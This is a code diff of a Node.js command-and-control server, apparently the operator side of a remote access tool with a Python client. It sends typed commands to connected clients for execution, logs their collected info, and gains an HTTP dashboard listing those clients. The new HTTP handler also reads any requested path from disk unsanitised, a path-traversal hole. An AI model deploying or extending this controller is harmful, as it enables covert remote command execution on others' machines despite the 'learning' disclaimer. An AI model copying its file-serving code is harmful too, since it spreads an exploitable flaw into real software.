@@ -4,30 +4,125 @@
     Author: MathIsSimple
     Using: Nodejs
     Type: Build
-    Build Version: 0.7
+    Build Version: 0.8
     Disclaimer: I created this project to learn about custom encoding and python sockets,
                 this projected isn't made to be used for maliscious intent. Do so at your own risk
 
 */
 
 const readline = require('readline');
+const http     = require('http');
 const net      = require('net');
 const fs       = require('fs');
 
 const characters    = "\"\\?abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'!&+*|`^@[]=#~-_<>(){}§$%µ£¤ç ";
 const bits_per_char = bin(characters.length).length;
 
-const LOGS  = "./logs/";
-let port    = 0;
-let server  = net.createServer();
+const LOGS     = "./logs/";
+const sockPort = 64500;
+const httpPort = 80;
+
 let clients = [];
 let current_socket_index = null;
+
+/*
+    PRELOADING
+*/
 
 if (fs.existsSync(LOGS) == false) {
     fs.mkdirSync(LOGS);
 }
 
-server.on('connection', function(socket) {
+/* CREATING SERVERS */
+
+let sockServer = net.createServer();
+let sockServerActive = false;
+let httpServer = http.createServer();
+let httpServerActive = false;
+
+/* LISTENING */
+
+httpServer.listen(httpPort, (err) => {
+    if (err) {
+        throw err;
+    }
+    console.log('Port %s successfully opened for the http server, awaiting requests...', httpPort);
+    httpServerActive = true;
+});
+
+sockServer.listen(sockPort, (err) => {
+    if (err) {
+        throw err;
+    }
+    console.log('Port %s successfully opened for the socket server, awaiting connections...', sockPort);
+    sockServerActive = true;
+});
+
+/* Connection Handling */
+
+httpServer.on('request', (request, response) => {
+    let url         = request.url;
+    let contentType = "";
+
+    const method    = request.method;
+
+    if (url == "/") {
+        url = "./index.html"; 
+        contentType = "text/html";
+    } else {
+        url = "." + url;
+        if (url != "./socket_info") {
+            if (url.includes(".css")) {
+                contentType = "text/css";
+            } else if (url.includes(".js")) {
+                contentType = "text/javascript";
+            }
+        } else {
+           contentType = "application/json"; 
+        }
+    }
+    if (fs.existsSync(url)) {
+        fs.readFile(url, (err, data) => {
+            if (err) {
+                throw err;
+            } else {
+                response.writeHead(200, {'Content-Type': contentType});
+
+                data = data.toString();
+
+                if (url == "./index.html") {
+                    data = data.replace("#sss", sockServerActive);
+                    data = data.replace("#sws", httpServerActive);
+
+                    data = data.replace("#pss", sockPort);
+                    data = data.replace("#pws", httpPort);
+
+                    data = data.replace("#nc", clients.length);
+                }
+
+                response.end(data);
+            }
+        });
+    } else {
+        if (url == "./socket_info") {
+            let res = {
+                info: []
+            };
+
+            for (let client of clients) {
+                res.info.push(client.variables.info);
+            }
+
+            response.writeHead(200, {'Content-Type': contentType});
+            response.end(JSON.stringify(res))
+        } else {
+            response.writeHead(404, {'Content-Type': 'text/plain'});
+            response.end("404 File Not Found");
+        }
+    }
+});
+
+sockServer.on('connection', function(socket) {
     const socket_index = clients.length;
 
     clients.push(
@@ -93,30 +188,19 @@ server.on('connection', function(socket) {
     });
 });
 
-ask('On Which Port do you want the server to start (Default set in client.py 64500) : ', (response) => {
-    port = Math.floor(response);
-    server.listen(port, () => {
-        console.log('Port %s successfully opened, awaiting connections...', port);
-    })
-});
-
-server.on('error', (err) => {
-    if (err) {
-        throw err;
-    }
-});
-
 function askCommand(socket_index) {
     ask('Command to execute : ', (command) => {
         switch(command) {
-            case "WRITE":
+            case "WRITE_LOG":
                 const time = new Date();
                 const filename = "log" + time.getHours() + "_" + time.getMinutes() + "_" + time.getSeconds() + ".json";
                 const file = LOGS + filename;
                 const data = JSON.stringify(clients[socket_index].variables);
 
                 fs.writeFile(file, data, (err) => {
-                    console.log(err);
+                    if (err != null) {
+                        throw err;
+                    }
                 });
                 askCommand(socket_index);
                 break;
@@ -130,14 +214,14 @@ function askCommand(socket_index) {
                 console.log("");
                 askCommand(socket_index);
                 break;
-            case "CHANGE":
+            case "CHANGE_CLIENT":
                 ask('Wich one do you want : ', (new_socket_index) => {
                     new_socket_index = Math.floor(new_socket_index);
                     current_socket_index = new_socket_index;
                     askCommand(new_socket_index);
                 });
                 break;
-            case "INFO":
+            case "CLIENT_INFO":
                 console.log("");
                 console.log("Printing info of current client ("+socket_index+")");
                 for (item of clients[socket_index].variables.info) {
@@ -145,6 +229,9 @@ function askCommand(socket_index) {
                 }
                 console.log("");
                 askCommand(socket_index);
+                break;
+            case "END":
+                process.exit(0);
                 break;
             default:
                 encrypt(command, function(response) {
@@ -168,6 +255,8 @@ function ask(question, callback) {
         callback(command);
     });
 }
+
+/* ENCRYPTION / DECRYPTION */
 
 function bin(nuber) {
     return (nuber >>> 0).toString(2)
